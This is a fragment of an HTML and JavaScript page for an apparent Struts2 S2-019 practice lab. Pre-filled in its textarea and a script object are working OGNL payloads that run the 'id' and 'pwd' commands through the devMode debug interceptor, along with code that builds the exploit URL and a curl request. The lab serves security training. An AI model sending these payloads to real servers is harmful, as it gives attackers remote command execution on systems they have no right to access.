...
<div class="wrap">
    <div class="card">
        <h1>Struts2 S2-019 演示靶场</h1>
        <p>这个模块开启了 <code>devMode</code>，可以通过 <code>?debug=command&amp;expression=...</code> 走进 <code>DebuggingInterceptor</code> 的命令调试分支。</p>
        <div class="actions">
            <button type="button" class="preset-btn" onclick="fillPreset('id')">执行 id</button>
            <button type="button" class="preset-btn" onclick="fillPreset('pwd')">执行 pwd</button>
            <button type="button" class="submit-btn" onclick="runPayload()">发送 debug 请求</button>
        </div>
        <div class="field">
            <label for="payloadBox">expression 参数</label>
            <textarea id="payloadBox">#a=(new java.lang.ProcessBuilder('id')).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#out=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#out.getWriter().println('dbapp:'+new java.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()</textarea>
        </div>
        <pre id="preview"></pre>
    </div>
</div>
<script>
    const payloads = {
        id: "#a=(new java.lang.ProcessBuilder('id')).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#out=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#out.getWriter().println('dbapp:'+new java.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()",
        pwd: "#a=(new java.lang.ProcessBuilder('pwd')).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#out=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#out.getWriter().println('dbapp:'+new java.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()"
    };
    ...
    function buildUrl() { return 'example/HelloWorld.action?debug=command&expression=' + strictEncode(document.getElementById('payloadBox').value); }
    function refreshPreview() { document.getElementById('preview').textContent = 'curl -i "http://宿主机IP:9956/' + buildUrl() + '"'; }
